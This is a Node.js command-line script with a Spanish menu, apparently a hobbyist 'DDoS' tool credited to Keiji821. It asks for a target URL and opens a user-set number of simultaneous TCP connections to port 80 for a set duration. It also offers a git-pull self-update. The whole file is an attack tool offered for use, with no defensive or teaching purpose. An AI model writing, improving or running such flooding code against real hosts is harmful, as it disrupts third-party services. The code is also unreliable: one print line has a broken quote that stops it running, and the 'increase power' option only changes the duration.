const net = require('net');
const rl = require('readline').createInterface({
input: process.stdin,
output: process.stdout
});

const ddosAttack = async (url, numConnections, attackDuration) => {
try {
console.log('[32mIniciando ataque DDoS...[0m');
const sockets = [];
for (let i = 0; i < numConnections; i++) {
const socket = new net.Socket();
socket.connect(80, url, () => {
console.log(`Connected to ${url}`);
});
socket.on('data', (data) => {
console.log(`Received data from ${url}`);
});
socket.on('error', (err) => {
console.error(`Error: ${err}`);
});
sockets.push(socket);
}

setTimeout(() => {
console.log('Attack finished');
sockets.forEach((socket) => socket.destroy());
}, attackDuration * 1000);
} catch (error) {
console.error(`Error: ${error}`);
}
};

const updateCode = async () => {
try {
console.log('[32mActualizando código...[0m');
const exec = require('child_process').exec;
exec('git pull origin main', (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error}`);
} else {
console.log('[32mCódigo actualizado correctamente![0m');
}
});
} catch (error) {
console.error(`Error: ${error}`);
}
};

const showMenu = () => {
console.clear(); // Limpiar la consola
console.log('[32mBienvenido al Termux Discord Bot![0m');
console.log(':')[33mDesarrollado por Keiji821[0m');
console.log('[36m⸂⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⸃[0m');
console.log('[32m1. Iniciar ataque DDoS[0m');
console.log('[36m2. Actualizar código desde GitHub[0m');
console.log('[33m3. Configurar conexiones simultaneas[0m');
console.log('[34m4. Aumentar potencia del ataque[0m');
console.log('[31m5. Salir[0m');
console.log('[36m⸌⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⸍[0m');
rl.setPrompt(`[34m[1m ➤ `); // Establecer el texto de la casilla "Opción: "
rl.prompt(); // Mostrar la casilla "Opción:"
};

let numConnections = 100; // Número de conexiones simultaneas por defecto
let attackDuration = 60; // Duración del ataque por defecto

showMenu(); // Mostrar el menú principal al inicio

rl.on('line', (option) => {
switch (option.trim()) {
case '1':
console.log('Ingrese la URL del objetivo: ');
rl.question('URL: ', (url) => {
if (url === '') {
console.log('URL invalida');
showMenu();
} else {
ddosAttack(url, numConnections, attackDuration);
showMenu(); // Volver a mostrar el menú principal
}
});
break;
case '2':
updateCode();
showMenu(); // Volver a mostrar el menú principal
break;
case '3':
console.log('Ingrese el número de conexiones simultaneas: ');
rl.question('Conexiones: ', (conexiones) => {
if (conexiones === '') {
console.log('Valor invalido');
showMenu();
} else {
numConnections = parseInt(conexiones);
console.log(`Conexiones simultaneas establecidas en ${numConnections}`);
showMenu(); // Volver a mostrar el menú principal
}
});
break;
case '4':
console.log('Ingrese la duración del ataque (en segundos): ');
rl.question('Duración: ', (duration) => {
if (duration === '') {
console.log('Valor invalido');
showMenu();
} else {
attackDuration = parseInt(duration);
console.log(`Duración del ataque establecida en ${attackDuration} segundos`);
showMenu(); // Volver a mostrar el menú principal
}
});
break;
case '5':
console.log('Saliendo...');
process.exit();
break;
}
}).on('close', () => {
process.exit();
});